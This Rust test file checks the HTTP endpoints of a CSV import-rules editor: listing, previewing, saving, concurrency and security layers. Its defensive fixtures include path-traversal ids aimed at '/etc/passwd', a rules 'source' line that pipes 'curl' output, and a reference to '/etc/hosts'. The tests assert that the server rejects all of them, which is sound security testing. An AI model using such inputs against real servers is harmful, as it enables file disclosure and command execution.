//! End-to-end HTTP tests for the CSV import-rules endpoints (Imports, steps
//! 7-8): `GET /api/rules`, `GET /api/rules/{*id}`,
//! `GET /api/rules-preview/{*id}` and `PUT /api/rules/{*id}`.
//!
//! Same harness as `edit_endpoints.rs`: the real axum `Router` driven through
//! `tower`'s `oneshot` over an [`AppState`] bound to a TEMP journal tree, so
//! every test asserts the HTTP status and body *and* what is left on disk.
//!
//! The engine underneath is unit-tested in `ledgeline-core`
//! (`tests/rules.rs`, `rules_security.rs`, `rules_preview.rs`). What is pinned
//! here is the HTTP contract and the five security layers the module docs set
//! out — in particular that a malformed id never reaches the filesystem, that
//! every resolution failure answers with one indistinguishable sentence, that no
//! response ever contains a resolved path, and that the write route is behind
//! the bearer token.
//!
//! The two golden-byte tests at the end are the wire contract itself. See
//! `native_wire_golden.rs` for why byte equality rather than semantic equality,
//! and `just snapshot-rules-wire` to regenerate — but only when the contract
//! changed on purpose.

mod common;

use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use axum::body::Body;
use axum::http::{HeaderName, Request, StatusCode, header};
use common::fixtures_dir;
use ledgeline::{AccessToken, AppState, Security, router_with_security, router_with_state};
use serde_json::{Value, json};
use tower::ServiceExt;

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

/// A minimal but real journal: the rules tree beside it is what the tests are
/// about, but the file still has to parse for an editor to open it.
const JOURNAL: &str = "\
2026-01-03 COFFEE HOUSE
    expenses:food:coffee  $6.45
    assets:bank:checking
";

/// The rules file most tests edit. Deliberately carries every construct the
/// write path treats differently: an editable directive, a `fields` list, a
/// top-level assignment, an editable conditional block, a comment run (trivia),
/// an `include` and a `source` (both keep-only), and an `if` table (opaque).
const RULES: &str = "\
skip 1
fields date, description, amount
account1 assets:bank:checking

# why this one exists
if COFFEE
    account2 expenses:food:coffee

if LANDLORD
    account2 expenses:home:rent

include common.rules
source ./bank.csv

if,account2,comment
ATM,assets:cash,cash out
";

static SEQ: AtomicU64 = AtomicU64::new(0);

/// A temp journal directory plus an editing-enabled state bound to its journal.
struct Tree {
    dir: PathBuf,
    journal: PathBuf,
    state: AppState,
}

impl Tree {
    /// Build a fresh tree containing `main.journal` and every `(relative path,
    /// contents)` given.
    fn new(files: &[(&str, &str)]) -> Self {
        let seq = SEQ.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!(
            "ledgeline-rules-endpoints/{}-{seq}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("temp dir");
        let journal = dir.join("main.journal");
        std::fs::write(&journal, JOURNAL).expect("write journal");
        for (relative, contents) in files {
            let path = dir.join(relative);
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent).expect("temp subdir");
            }
            std::fs::write(&path, contents).expect("write rules file");
        }
        let state = AppState::from_journal_path(&journal).expect("editor opens");
        Self {
            dir,
            journal,
            state,
        }
    }

    /// The default shape: one `bank.csv.rules` two directories down, beside its
    /// data file.
    fn standard() -> Self {
        Self::new(&[
            ("import/2026/bank.csv.rules", RULES),
            (
                "import/2026/bank.csv",
                "Date,Description,Amount\n2026-01-03,COFFEE HOUSE,-6.45\n",
            ),
        ])
    }

    fn path(&self, relative: &str) -> PathBuf {
        self.dir.join(relative)
    }

    fn read(&self, relative: &str) -> String {
        std::fs::read_to_string(self.path(relative)).expect("read rules file")
    }

    /// A READ-ONLY state over the same tree: parsed in memory with no editor
    /// bound, exactly as `app()` builds for the oneshot harness.
    fn read_only(&self) -> AppState {
        let text = std::fs::read_to_string(&self.journal).expect("read journal");
        let journal = ledgeline_core::parse_journal(&text, &self.journal.to_string_lossy())
            .expect("journal parses");
        AppState::from_journal(&journal)
    }

    /// Every spelling of this tree's own directory that could leak into a
    /// response: the path as constructed and its canonical form (which on macOS
    /// gains a `/private` prefix).
    fn secret_paths(&self) -> Vec<String> {
        let mut paths = vec![self.dir.to_string_lossy().into_owned()];
        if let Ok(canonical) = self.dir.canonicalize() {
            paths.push(canonical.to_string_lossy().into_owned());
        }
        paths
    }
}

impl Drop for Tree {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// One request against a fresh router over `state` (clones share the editor,
/// the snapshot and the rules-write mutex, so effects persist between calls).
async fn send(
    state: &AppState,
    method: &str,
    uri: &str,
    body: Option<Value>,
) -> (StatusCode, Vec<(String, String)>, Vec<u8>) {
    let builder = Request::builder().method(method).uri(uri);
    let request = match body {
        Some(value) => builder
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(serde_json::to_vec(&value).expect("serialize")))
            .expect("request builds"),
        None => builder.body(Body::empty()).expect("request builds"),
    };
    let response = router_with_state(state.clone())
        .oneshot(request)
        .await
        .expect("router responds");
    let status = response.status();
    let headers = response
        .headers()
        .iter()
        .filter_map(|(name, value)| {
            Some((name.as_str().to_string(), value.to_str().ok()?.to_string()))
        })
        .collect();
    let bytes = http_body_util::BodyExt::collect(response.into_body())
        .await
        .expect("body collects")
        .to_bytes()
        .to_vec();
    (status, headers, bytes)
}

/// A request whose body is expected to be JSON.
async fn json(
    state: &AppState,
    method: &str,
    uri: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let (status, _, bytes) = send(state, method, uri, body).await;
    let value = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
    (status, value)
}

/// A request whose body is expected to be the plain-text error sentence.
async fn text(
    state: &AppState,
    method: &str,
    uri: &str,
    body: Option<Value>,
) -> (StatusCode, String) {
    let (status, _, bytes) = send(state, method, uri, body).await;
    (status, String::from_utf8_lossy(&bytes).into_owned())
}

const BANK: &str = "/api/rules/import/2026/bank.csv.rules";

/// `GET` the document and hand back its revision plus its items array.
async fn load(state: &AppState) -> (String, Vec<Value>) {
    let (status, doc) = json(state, "GET", BANK, None).await;
    assert_eq!(status, StatusCode::OK, "{doc}");
    let revision = doc["revision"].as_str().expect("revision").to_string();
    let items = doc["items"].as_array().expect("items").clone();
    (revision, items)
}

/// The `items` array as a save request keeps every item exactly where it is.
fn keep_all(items: &[Value]) -> Vec<Value> {
    items
        .iter()
        .map(|item| json!({"kind": "keep", "id": item["id"]}))
        .collect()
}

// ---------------------------------------------------------------------------
// GET /api/rules — the index
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_index_summarizes_every_discovered_file_and_is_deterministic() {
    let tree = Tree::standard();
    let (status, first) = json(&tree.state, "GET", "/api/rules", None).await;
    assert_eq!(status, StatusCode::OK);

    assert_eq!(first["editable"], true, "an editor is bound");
    assert_eq!(first["truncated"], false);
    assert_eq!(first["warnings"], json!([]));
    let files = first["files"].as_array().expect("files");
    assert_eq!(files.len(), 1, "{first}");
    let file = &files[0];
    assert_eq!(file["id"], "import/2026/bank.csv.rules");
    assert_eq!(file["label"], "bank", "the `.csv.rules` suffix is stripped");
    assert_eq!(file["parsed"], true);
    assert_eq!(file["account1"], "assets:bank:checking");
    assert_eq!(file["editableBlockCount"], 2);
    assert_eq!(file["opaqueItemCount"], 1, "the `if` table stays opaque");
    assert!(
        file["revision"]
            .as_str()
            .is_some_and(|token| !token.is_empty()),
        "a parsed file carries a fingerprint token"
    );

    // Two scans of an unchanged tree must produce the same bytes, or a polling
    // UI would redraw its list for no reason.
    let (_, second) = json(&tree.state, "GET", "/api/rules", None).await;
    assert_eq!(first, second);
}

/// `rootLabel` is a single path component and never the path — a heading a GUI
/// can write without ever being handed the directory.
#[tokio::test]
async fn the_index_labels_the_root_without_disclosing_it() {
    let tree = Tree::standard();
    let (_, index) = json(&tree.state, "GET", "/api/rules", None).await;
    let label = index["rootLabel"].as_str().expect("rootLabel");
    assert!(!label.contains('/'), "a label is one component: {label}");
    assert!(
        tree.dir.ends_with(label),
        "the label is the root's own final component"
    );
}

/// A state with no editor bound still LISTS the files — a read-only imports
/// screen is useful — but says so, so the UI does not offer an edit that would
/// come back a `501`.
#[tokio::test]
async fn a_read_only_state_lists_the_files_but_is_not_editable() {
    let tree = Tree::standard();
    let (status, index) = json(&tree.read_only(), "GET", "/api/rules", None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(index["editable"], false);
    assert_eq!(
        index["files"].as_array().map(Vec::len),
        Some(1),
        "read-only is not the same as empty"
    );
}

/// All three reads are `no-store` with no validator at all. See the module docs:
/// the ETag is one shared per-journal counter, so there is no honest value to
/// put here.
#[tokio::test]
async fn every_read_is_no_store_and_carries_no_etag() {
    let tree = Tree::standard();
    for uri in [
        "/api/rules",
        BANK,
        "/api/rules-preview/import/2026/bank.csv.rules",
    ] {
        let (status, headers, _) = send(&tree.state, "GET", uri, None).await;
        assert_eq!(status, StatusCode::OK, "GET {uri}");
        let header_of = |name: &str| {
            headers
                .iter()
                .find(|(key, _)| key == name)
                .map(|(_, value)| value.clone())
        };
        assert_eq!(
            header_of("cache-control").as_deref(),
            Some("no-store"),
            "{uri}"
        );
        assert_eq!(header_of("etag"), None, "{uri} must carry no validator");
    }
}

// ---------------------------------------------------------------------------
// GET /api/rules/{*id} — the document
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_document_describes_every_item_kind() {
    let tree = Tree::standard();
    let (status, doc) = json(&tree.state, "GET", BANK, None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(doc["id"], "import/2026/bank.csv.rules");
    assert_eq!(doc["label"], "bank");
    assert_eq!(doc["editable"], true);
    assert_eq!(doc["newline"], "lf");

    let kinds: Vec<&str> = doc["items"]
        .as_array()
        .expect("items")
        .iter()
        .filter_map(|item| item["kind"].as_str())
        .collect();
    for expected in [
        "directive",
        "fields",
        "assignment",
        "ifBlock",
        "include",
        "opaque",
    ] {
        assert!(kinds.contains(&expected), "no {expected} item in {kinds:?}");
    }

    // The settings projection names the item that produced each entry, which is
    // what keeps a preferences panel a view rather than a second copy.
    let settings = &doc["settings"];
    assert_eq!(settings["skip"]["value"], 1);
    assert_eq!(settings["account1"]["value"], "assets:bank:checking");
    assert_eq!(
        settings["fields"]["names"],
        json!(["date", "description", "amount"])
    );
    let named = settings["account1"]["itemId"].as_u64().expect("itemId");
    let owner = doc["items"]
        .as_array()
        .expect("items")
        .iter()
        .find(|item| item["id"].as_u64() == Some(named))
        .expect("the named item exists");
    assert_eq!(owner["kind"], "assignment");
    assert_eq!(owner["field"], "account1");

    // `source` is described, flagged, and never followed.
    assert_eq!(settings["source"]["value"], "./bank.csv");
    assert_eq!(settings["source"]["executesShellCommand"], false);
}

/// An opaque item carries its raw bytes so the UI can show what it cannot edit.
#[tokio::test]
async fn an_opaque_item_carries_its_reason_and_its_text() {
    let tree = Tree::standard();
    let (_, doc) = json(&tree.state, "GET", BANK, None).await;
    let table = doc["items"]
        .as_array()
        .expect("items")
        .iter()
        .find(|item| item["kind"] == "opaque")
        .expect("the `if` table is opaque");
    assert_eq!(table["reason"], "ifTable");
    assert_eq!(table["truncated"], false);
    assert!(
        table["text"]
            .as_str()
            .is_some_and(|text| text.contains("ATM,assets:cash,cash out")),
        "{table}"
    );
}

// ---------------------------------------------------------------------------
// GET /api/rules-preview/{*id}
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_preview_labels_the_columns_from_the_data_file() {
    let tree = Tree::standard();
    let (status, preview) = json(
        &tree.state,
        "GET",
        "/api/rules-preview/import/2026/bank.csv.rules",
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(preview["available"], true);
    assert_eq!(preview["dataLabel"], "bank.csv", "a NAME, never a path");
    assert_eq!(preview["separator"], ",");
    assert_eq!(
        preview["header"],
        json!(["Date", "Description", "Amount"]),
        "`skip 1` makes record 0 the header"
    );
    assert_eq!(preview["columns"], 3);
}

/// A refusal is a value, not an error: the GUI gets a `200` and a reason it can
/// explain, and nothing on disk was read.
#[tokio::test]
async fn a_source_that_is_a_shell_command_is_reported_never_run() {
    let tree = Tree::new(&[(
        "piped.csv.rules",
        "source curl https://example.invalid/x.csv | cat\nskip 1\nfields date, amount\n",
    )]);
    let (status, preview) = json(
        &tree.state,
        "GET",
        "/api/rules-preview/piped.csv.rules",
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(preview["available"], false);
    assert_eq!(preview["reason"], "sourceIsCommand");
    assert_eq!(preview["rows"], json!([]));
}

// ---------------------------------------------------------------------------
// PUT /api/rules/{*id} — the write path
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_reorder_moves_a_paragraph_without_touching_a_byte_of_it() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (revision, items) = load(&tree.state).await;

    // Swap the two editable conditional blocks. A reorder is a permutation of
    // the parts of a partition, so it cannot lose or mangle a byte — including
    // the `# why this one exists` comment, which travels with the block it
    // annotates.
    let blocks: Vec<u64> = items
        .iter()
        .filter(|item| item["kind"] == "ifBlock")
        .filter_map(|item| item["id"].as_u64())
        .collect();
    assert_eq!(blocks.len(), 2, "two editable blocks to swap");
    let mut order = keep_all(&items);
    let (first, second) = (
        order
            .iter()
            .position(|slot| slot["id"].as_u64() == Some(blocks[0]))
            .expect("first block"),
        order
            .iter()
            .position(|slot| slot["id"].as_u64() == Some(blocks[1]))
            .expect("second block"),
    );
    order.swap(first, second);

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    let after = tree.read("import/2026/bank.csv.rules");
    assert_ne!(after, before, "the blocks really did move");
    assert!(after.contains("# why this one exists\nif COFFEE"));
    assert!(
        after.find("if LANDLORD") < after.find("# why this one exists"),
        "LANDLORD now comes first:\n{after}"
    );
    // Byte conservation: the same multiset of lines, reordered.
    let sorted = |text: &str| {
        let mut lines: Vec<&str> = text.lines().collect();
        lines.sort_unstable();
        lines.join("\n")
    };
    assert_eq!(sorted(&after), sorted(&before));
    assert_ne!(saved["revision"], revision, "a new revision was issued");
}

#[tokio::test]
async fn editing_one_assignment_leaves_every_other_byte_alone() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (revision, items) = load(&tree.state).await;

    let target = items
        .iter()
        .find(|item| item["kind"] == "assignment" && item["field"] == "account1")
        .expect("the top-level account1")
        .clone();
    let order: Vec<Value> = items
        .iter()
        .map(|item| {
            if item["id"] == target["id"] {
                json!({
                    "kind": "assignment",
                    "id": item["id"],
                    "field": "account1",
                    "value": "assets:bank:savings",
                })
            } else {
                json!({"kind": "keep", "id": item["id"]})
            }
        })
        .collect();

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    let after = tree.read("import/2026/bank.csv.rules");
    assert_eq!(
        after,
        before.replace(
            "account1 assets:bank:checking",
            "account1 assets:bank:savings"
        ),
        "exactly one line changed"
    );
    // The response describes what actually landed.
    assert_eq!(
        saved["settings"]["account1"]["value"],
        "assets:bank:savings"
    );
}

#[tokio::test]
async fn an_inserted_conditional_block_is_rendered_from_typed_fields() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;

    let mut order = keep_all(&items);
    // Placed after the last editable block rather than at the end, so this is an
    // insert with items on BOTH sides — the position that has to splice rather
    // than append. Appending after the trailing table is its own test below.
    let after_last_block = items
        .iter()
        .rposition(|item| item["kind"] == "ifBlock")
        .expect("an editable block")
        + 1;
    order.insert(
        after_last_block,
        json!({
            "kind": "ifBlock",
            "groups": [{"matchers": [{"field": "description", "pattern": "PHARMACY"}]}],
            "assignments": [{"field": "account2", "value": "expenses:health"}],
        }),
    );

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    let after = tree.read("import/2026/bank.csv.rules");
    assert!(
        after.contains("if %description PHARMACY\n    account2 expenses:health\n"),
        "the renderer's own output, not the client's text:\n{after}"
    );
}

/// The AND/OR nesting, both directions, over the same item.
///
/// `groups` is the one field on this wire whose *shape* carries meaning rather
/// than a value: a client that flattened it would send matchers the engine
/// would OR where the user asked it to AND, and every existing test would still
/// pass because the file would still be valid hledger. So this reads a
/// `&`-chain block back, asserts the nesting, and saves a re-grouped one.
#[tokio::test]
async fn an_and_group_survives_the_wire_in_both_directions() {
    let tree = Tree::new(&[(
        "import/2026/bank.csv.rules",
        "skip 1\nfields date, description, amount\naccount1 assets:bank:checking\n\n\
         if\nCOFFEE\n& HOUSE\nLANDLORD\n    account2 expenses:food:coffee\n",
    )]);
    let (revision, items) = load(&tree.state).await;

    let block = items
        .iter()
        .find(|item| item["kind"] == "ifBlock")
        .expect("an editable block");
    assert_eq!(
        block["groups"],
        json!([
            {"matchers": [{"pattern": "COFFEE"}, {"pattern": "HOUSE"}]},
            {"matchers": [{"pattern": "LANDLORD"}]},
        ]),
        "the `&` line is nesting, not text: {block}"
    );

    // Move `HOUSE` out into its own OR branch and give the second group an AND
    // condition — the two edits the grouped shape exists to express.
    let mut order = keep_all(&items);
    order[block["id"].as_u64().expect("an id") as usize] = json!({
        "kind": "ifBlock",
        "id": block["id"],
        "groups": [
            {"matchers": [{"pattern": "COFFEE"}]},
            {"matchers": [{"pattern": "HOUSE"}]},
            {"matchers": [{"pattern": "LANDLORD"}, {"field": "amount", "pattern": "^-"}]},
        ],
        "assignments": [{"field": "account2", "value": "expenses:food:coffee"}],
    });

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    // `HOUSE` lost its `&` and `%amount ^-` gained one, on their own lines and
    // nowhere else.
    assert_eq!(
        tree.read("import/2026/bank.csv.rules"),
        "skip 1\nfields date, description, amount\naccount1 assets:bank:checking\n\n\
         if\nCOFFEE\nHOUSE\nLANDLORD\n& %amount ^-\n    account2 expenses:food:coffee\n"
    );
}

/// Adding a rule to a file that ENDS IN A CONDITIONAL TABLE — the shape that
/// used to answer `500`.
///
/// A table's extent runs to the first empty line or to EOF, so `RULES`'s table
/// carries no terminator; the appended block's lines re-parsed as more of its
/// data rows, `verify` refused (rightly), and an ordinary "add a rule" came back
/// as an internal error the user could do nothing about. The engine now supplies
/// the blank line the moment the table stops being last, so the rule lands where
/// the user put it — which is also the position that matters, because later
/// matches win.
#[tokio::test]
async fn a_rule_appended_after_a_trailing_table_lands_last() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;
    assert_eq!(
        items.last().map(|item| &item["kind"]),
        Some(&json!("opaque")),
        "this fixture must end in the conditional table"
    );

    let mut order = keep_all(&items);
    order.push(json!({
        "kind": "ifBlock",
        "groups": [{"matchers": [{"field": "description", "pattern": "PHARMACY"}]}],
        "assignments": [{"field": "account2", "value": "expenses:health"}],
    }));

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    // The file is the original bytes, the blank line that closes the table, and
    // the new rule. Nothing else moved.
    assert_eq!(
        tree.read("import/2026/bank.csv.rules"),
        format!("{RULES}\nif %description PHARMACY\n    account2 expenses:health\n\n")
    );

    // And it reads back as a rule rather than as two more table rows.
    let saved_items = saved["items"].as_array().expect("items");
    let last = saved_items.last().expect("a last item");
    assert_eq!(last["kind"], "ifBlock", "{saved}");
    assert_eq!(last["groups"][0]["matchers"][0]["pattern"], "PHARMACY");
    let table = &saved_items[saved_items.len() - 2];
    assert_eq!(table["kind"], "opaque");
    assert_eq!(
        table["text"], "if,account2,comment\nATM,assets:cash,cash out\n\n",
        "the table's own paragraph gained the blank line and nothing else"
    );
}

#[tokio::test]
async fn deleting_an_item_removes_its_whole_paragraph() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;

    let doomed = items
        .iter()
        .find(|item| item["kind"] == "ifBlock")
        .expect("an editable block")["id"]
        .clone();
    let order: Vec<Value> = items
        .iter()
        .filter(|item| item["id"] != doomed)
        .map(|item| json!({"kind": "keep", "id": item["id"]}))
        .collect();

    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order, "delete": [doomed]})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    let after = tree.read("import/2026/bank.csv.rules");
    assert!(!after.contains("if COFFEE"), "{after}");
    assert!(
        !after.contains("# why this one exists"),
        "the comment that annotated it went with it:\n{after}"
    );
    assert!(after.contains("if LANDLORD"), "nothing else went with it");
}

/// Omitting an item is never an implicit delete: a client bug that drops half
/// its array must not silently truncate the user's rules file.
#[tokio::test]
async fn a_plan_that_omits_an_item_is_refused_rather_than_treated_as_a_delete() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (revision, items) = load(&tree.state).await;
    let order: Vec<Value> = keep_all(&items).into_iter().skip(1).collect();

    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("must list every item"), "{body}");
    assert_eq!(
        tree.read("import/2026/bank.csv.rules"),
        before,
        "nothing was written"
    );
}

/// A save that produces byte-identical content writes NOTHING — not even the
/// same bytes. Rewriting them would bump mtime and a user's own `entr` or
/// `hledger import` watch loop would fire for a change that never happened
/// (PERF-4's lesson, from the other direction).
#[tokio::test]
async fn a_no_op_save_writes_nothing_and_leaves_mtime_untouched() {
    let tree = Tree::standard();
    let path = tree.path("import/2026/bank.csv.rules");
    let modified = |path: &Path| {
        std::fs::metadata(path)
            .and_then(|meta| meta.modified())
            .expect("mtime")
    };
    let before_mtime = modified(&path);
    let before = tree.read("import/2026/bank.csv.rules");

    let (revision, items) = load(&tree.state).await;
    let (status, saved) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": keep_all(&items)})),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{saved}");

    assert_eq!(tree.read("import/2026/bank.csv.rules"), before);
    assert_eq!(
        modified(&path),
        before_mtime,
        "an identical save must not touch the file at all"
    );
    assert_eq!(
        saved["revision"], revision,
        "the revision is unchanged because the bytes are"
    );

    // The control: a save that DOES change the bytes moves mtime, so the
    // assertion above is measuring something.
    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    let (revision, items) = load(&tree.state).await;
    let order: Vec<Value> = items
        .iter()
        .map(|item| {
            if item["kind"] == "assignment" {
                json!({"kind": "assignment", "id": item["id"], "field": "account1", "value": "assets:other"})
            } else {
                json!({"kind": "keep", "id": item["id"]})
            }
        })
        .collect();
    let (status, _) = json(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_ne!(modified(&path), before_mtime, "a real write moves mtime");
}

// ---------------------------------------------------------------------------
// Optimistic concurrency
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_stale_revision_is_a_409_and_writes_nothing() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (_, items) = load(&tree.state).await;

    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": "0-0000000000000000", "items": keep_all(&items)})),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert!(body.contains("changed on disk"), "{body}");
    assert_eq!(tree.read("import/2026/bank.csv.rules"), before);
}

/// The window this closes: the client reads, somebody else writes, the client
/// saves. Its revision is stale by the time it arrives, so the save is refused
/// and the other person's edit survives.
#[tokio::test]
async fn a_file_rewritten_between_the_get_and_the_put_is_a_409() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;

    let meanwhile = format!("{RULES}\n# somebody else got here first\n");
    std::fs::write(tree.path("import/2026/bank.csv.rules"), &meanwhile).expect("external write");

    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": keep_all(&items)})),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert!(body.contains("changed on disk"), "{body}");
    assert_eq!(
        tree.read("import/2026/bank.csv.rules"),
        meanwhile,
        "the other write survived intact"
    );
}

// ---------------------------------------------------------------------------
// Security layer 1: the id, before any filesystem call
// ---------------------------------------------------------------------------

/// Every one of these is refused on SHAPE, before anything touches the
/// filesystem — which is why the answer is `400` and not `404`. A route that
/// decided this on existence would be an existence oracle.
#[tokio::test]
async fn a_malformed_id_is_a_400_on_every_route() {
    let tree = Tree::standard();
    let malformed = [
        "/api/rules/../escape.rules",
        "/api/rules/%2e%2e%2fescape.rules",
        "/api/rules//etc/passwd",
        "/api/rules/%2fetc%2fpasswd.rules",
        "/api/rules/x.txt",
        "/api/rules/x%00.rules",
        "/api/rules/a%5Cb.rules",
        "/api/rules/C:/x.rules",
        // Ten components — one deeper than the scan can ever reach, so no id
        // this long can name a discovered file.
        "/api/rules/a/b/c/d/e/f/g/h/i/j.rules",
    ];
    for uri in malformed {
        let (status, body) = text(&tree.state, "GET", uri, None).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "GET {uri} -> {body}");

        let preview = uri.replace("/api/rules/", "/api/rules-preview/");
        let (status, body) = text(&tree.state, "GET", &preview, None).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "GET {preview} -> {body}");

        let (status, body) = text(
            &tree.state,
            "PUT",
            uri,
            Some(json!({"revision": "x", "items": []})),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "PUT {uri} -> {body}");
    }
}

/// The id cap and the scan's depth cap have to agree, and they are set in two
/// files that cannot see each other. This walks the coupling: discover a file at
/// the deepest place the scan will go, then fetch it by the id the index itself
/// handed out. A cap that is one too small makes a file that is listed and
/// cannot be opened — the worst kind of wrong, because the UI shows it.
#[tokio::test]
async fn a_file_at_the_scan_s_maximum_depth_can_be_opened() {
    // Eight directories below the root, which is `MAX_RULES_DEPTH`, so the id
    // has nine components.
    let deep = "a/b/c/d/e/f/g/h/deep.rules";
    let tree = Tree::new(&[(deep, "skip 1\nfields date, amount\n")]);

    let (status, index) = json(&tree.state, "GET", "/api/rules", None).await;
    assert_eq!(status, StatusCode::OK);
    let listed = index["files"]
        .as_array()
        .expect("files")
        .iter()
        .find(|file| file["id"] == deep)
        .unwrap_or_else(|| panic!("the scan should reach depth 8: {index}"));

    let id = listed["id"].as_str().expect("id");
    let (status, doc) = json(&tree.state, "GET", &format!("/api/rules/{id}"), None).await;
    assert_eq!(
        status,
        StatusCode::OK,
        "an id the index just handed out must be openable: {doc}"
    );
    assert_eq!(doc["id"], deep);
}

/// A document with more constructs than a save could ever name is refused on the
/// way OUT, not just on the way in. Serving it would hand the client a document
/// it could never save back: the engine requires a plan to account for every
/// item, so it would be stuck between two limits with no way to satisfy both.
#[tokio::test]
async fn a_document_with_more_items_than_a_save_can_name_is_not_served() {
    // One unclassifiable line per item, well past the cap and well under the
    // 1 MiB read cap.
    let huge: String = (0..2_500).map(|n| format!("~{n}\n")).collect();
    let tree = Tree::new(&[("huge.rules", &huge)]);

    // It is still LISTED — a file the user can see beats a file that silently
    // is not there.
    let (status, index) = json(&tree.state, "GET", "/api/rules", None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        index["files"]
            .as_array()
            .is_some_and(|files| files.iter().any(|file| file["id"] == "huge.rules")),
        "{index}"
    );

    let (status, body) = text(&tree.state, "GET", "/api/rules/huge.rules", None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("cannot be opened for editing"), "{body}");
}

/// A well-formed id that no scan produced is a `404`, and the sentence is the
/// same one every other resolution failure gets.
#[tokio::test]
async fn an_unknown_id_is_a_404_with_one_indistinguishable_sentence() {
    let tree = Tree::standard();
    let (status, missing) = text(&tree.state, "GET", "/api/rules/nope.rules", None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    // A decoy the walk deliberately refuses to find: `node_modules` is on the
    // skip list. It must be indistinguishable from a file that simply is not
    // there, or the route reports what is on disk.
    let hidden = Tree::new(&[("node_modules/dep.rules", RULES)]);
    let (status, skipped) = text(
        &hidden.state,
        "GET",
        "/api/rules/node_modules/dep.rules",
        None,
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    assert_eq!(
        skipped.replace("node_modules/dep.rules", "X"),
        missing.replace("nope.rules", "X"),
        "the two 404s differ by nothing but the caller's own id"
    );
}

/// The whole point of layer 5. Not one response — success or failure — may
/// contain the scan root or any absolute path.
#[tokio::test]
async fn no_response_body_ever_contains_a_resolved_path() {
    let tree = Tree::new(&[
        ("import/2026/bank.csv.rules", RULES),
        (
            "outside-root.csv.rules",
            "source /etc/hosts\nfields date, amount\n",
        ),
    ]);
    let secrets = tree.secret_paths();
    let probes: Vec<(&str, String, Option<Value>)> = vec![
        ("GET", "/api/rules".to_string(), None),
        ("GET", BANK.to_string(), None),
        (
            "GET",
            "/api/rules-preview/import/2026/bank.csv.rules".to_string(),
            None,
        ),
        (
            "GET",
            "/api/rules-preview/outside-root.csv.rules".to_string(),
            None,
        ),
        ("GET", "/api/rules/nope.rules".to_string(), None),
        ("GET", "/api/rules/../escape.rules".to_string(), None),
        (
            "PUT",
            BANK.to_string(),
            Some(json!({"revision": "stale", "items": []})),
        ),
        (
            "PUT",
            "/api/rules/nope.rules".to_string(),
            Some(json!({"revision": "x", "items": []})),
        ),
    ];
    for (method, uri, body) in probes {
        let (_, _, bytes) = send(&tree.state, method, &uri, body).await;
        let rendered = String::from_utf8_lossy(&bytes);
        for secret in &secrets {
            assert!(
                !rendered.contains(secret.as_str()),
                "{method} {uri} disclosed {secret}:\n{rendered}"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Security layer 4: content provenance
